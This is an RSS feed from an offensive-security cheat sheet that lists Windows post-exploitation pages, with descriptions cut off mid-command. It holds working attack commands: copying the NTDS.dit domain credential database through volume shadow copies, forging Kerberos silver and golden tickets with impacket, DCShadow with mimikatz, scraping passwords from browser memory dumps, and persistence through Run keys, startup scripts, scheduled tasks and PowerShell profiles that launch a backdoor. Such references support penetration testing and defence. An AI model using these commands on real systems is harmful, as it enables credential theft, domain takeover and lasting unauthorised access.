<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Post Exploitation Techniques on Offensive Security Cheatsheet</title>
    <link>/windows-systems/post-exploitation-techniques/</link>
    <description>Recent content in Post Exploitation Techniques on Offensive Security Cheatsheet</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language><atom:link href="/windows-systems/post-exploitation-techniques/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>NTDS Database</title>
      <link>/windows-systems/post-exploitation-techniques/ntds_database/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/post-exploitation-techniques/ntds_database/</guid>
      <description># Initial location of the NTDS database on the domain controller C:\Windows\NTDS\NTDS.dit # Step 1 → Finding a way to get the NDTS.dis and SYSTEM file # Step 2 → Crack/Analyze offline Local Extraction VSSadmin # Récupération via VSSadmin # Create a Volume Shadow Copy C:\Windows\system32&amp;gt; vssadmin create shadow /for=C: # Retrieve NTDS from the copy C:\Windows\system32&amp;gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit c:\Extract\ntds.dit # Copy SYSTEM file C:\Windows\system32&amp;gt; reg SAVE HKLM\SYSTEM c:\Extract\SYS C:\Windows\system32&amp;gt; copy \\?</description>
    </item>
    
    <item>
      <title>Silver and Golden Tickets</title>
      <link>/windows-systems/post-exploitation-techniques/silver_golden_tickets/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/post-exploitation-techniques/silver_golden_tickets/</guid>
      <description>Ticket generation from Linux # Generate a ticket or convert it (kekeo) to ccache format $ ticketer.py -nthash &amp;lt;hash&amp;gt; -domain-sid &amp;lt;sid&amp;gt; -domain &amp;lt;domain&amp;gt; &amp;lt;user&amp;gt; # Export the path in the right variable $ export KRB5CCNAME=/tmp/ticket.ccache $ klist # Exec and use the ticket $ /impacket/examples/psexec.py -k -n -debug DOMAIN/user@host # Dump NTDS $ proxychains secretsdump.py -k -no-pass qsec@DCFIL.PRAMAFIL.CORP -use-vss Golden Ticket # Golden Ticket &amp;gt; Nom du compte administrateur (Administrateur) &amp;gt; Nom complet du domaine (domain.</description>
    </item>
    
    <item>
      <title>DC Shadow</title>
      <link>/windows-systems/post-exploitation-techniques/dc_shadow/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/post-exploitation-techniques/dc_shadow/</guid>
      <description># DC Shadow is a post compromission attack, allowing you to update replication metadata # On a compromised client, using a domain admin account # You can attack with Mimikatz # Terminal 1 (runas) mimikatz # !+ mimikatz # !processtoken mimikatz # lsadump::dcshadow /object:dtargaryen /attribute:description /value:&amp;#34;The Game&amp;#34; /replOriginatingUid:{00000000-0000-0000-0000-000000000000} /replOriginatingTime:&amp;#34;2017-01-01 09:00:00&amp;#34; /replOriginatingUsn:42 # Terminal 2 (runas) mimikatz # lsadump::dcshadow /push # You can check the success throught repadmin on the DC repadmin /showobjmeta DC01.</description>
    </item>
    
    <item>
      <title>Searching Informations</title>
      <link>/windows-systems/post-exploitation-techniques/searching_informations/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/post-exploitation-techniques/searching_informations/</guid>
      <description>Tips # Getting passwords from browser memory procdump.exe -ma firefox_pid strings.exe firefox.dmp | findstr /i &amp;#34;Passwd=&amp;#34; Scavenger # Scavenger is a tool used above CrackMapExec to automate the process # of looking for sensitive files and informations during Internal Pentest python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local $ python3 ./scavenger.py smb --target iplist --username administrator --password Password123 --domain test.local --overwrite WinSCP # WinSCP is potentially exploitable in the registry if not using a master password # You can manually request the key reg.</description>
    </item>
    
    <item>
      <title>Persistence</title>
      <link>/windows-systems/post-exploitation-techniques/persistence/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/post-exploitation-techniques/persistence/</guid>
      <description>Resources https://rastamouse.me/2018/03/a-view-of-persistence/ Userland &amp;amp; Elevated # Userland techniques # HKCU # Create a REG_SZ value in the Run key within HKCU\Software\Microsoft\Windows. (Other keys are available). Value name: Backdoor Value data: C:\Users\Rasta\AppData\Local\Temp\backdoor.exe # Start-up # Create a batch script in the user startup folder. PS C:\&amp;gt; gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe # Scheduled Tasks PS C:\&amp;gt; $A = New-ScheduledTaskAction -Execute &amp;#34;cmd.exe&amp;#34; -Argument &amp;#34;/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe&amp;#34; PS C:\&amp;gt; $T = New-ScheduledTaskTrigger -AtLogOn -User &amp;#34;Rasta&amp;#34; PS C:\&amp;gt; $P = New-ScheduledTaskPrincipal &amp;#34;Rasta&amp;#34; PS C:\&amp;gt; $S = New-ScheduledTaskSettingsSet PS C:\&amp;gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S PS C:\&amp;gt; Register-ScheduledTask Backdoor -InputObject $D # Powershell profiles # You can backdoor the powershell profile PS C:\&amp;gt; Test-Path $profile False PS C:\&amp;gt; New-Item -Path $profile -Type File –Force Directory: C:\Users\Rasta\Documents\WindowsPowerShell Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 22/03/2018 12:42 0 Microsoft.</description>
    </item>
    
  </channel>
</rss>
